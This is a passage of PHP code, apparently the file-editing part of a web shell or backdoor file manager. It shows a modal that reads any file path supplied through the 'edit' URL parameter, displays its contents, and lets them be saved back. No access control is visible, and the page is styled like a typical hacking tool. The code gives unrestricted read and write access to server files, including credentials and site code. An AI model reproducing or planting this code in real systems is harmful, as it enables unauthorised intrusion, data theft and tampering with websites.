</table>
</form>


<?php if(isset($_GET['edit'])):
$ef=$_GET['edit'];
$content=htmlspecialchars(@file_get_contents($ef));
?>
<div id="editModal" class="modal-overlay"><div class="modal-box">

<h3 style="color:#00d0ff">Editing: <?php echo htmlspecialchars($ef); ?></h3>

<?php if($saveStatus==="success"): ?>
<div class="alert-success">✔ File saved</div>
<?php elseif($saveStatus==="error"): ?>
<div class="alert-error">✖ Save failed</div>
<?php endif; ?>

<form method="post">
<input type="hidden" name="filepath" value="<?php echo htmlspecialchars($ef); ?>">
<textarea name="content" style="width:100%;height:70vh;background:#000;color:#0f0;border:1px solid #ff0000"><?php echo $content; ?></textarea>

<div style="text-align:right;margin-top:8px">
<button type="submit" name="savefile" style="background:#00d0ff;color:#000">Save</button>
<button type="button" onclick="closeEdit()" style="background:#ff0000">Close</button>
</div>

</form>

</div></div>
<?php endif; ?>

</body></html>
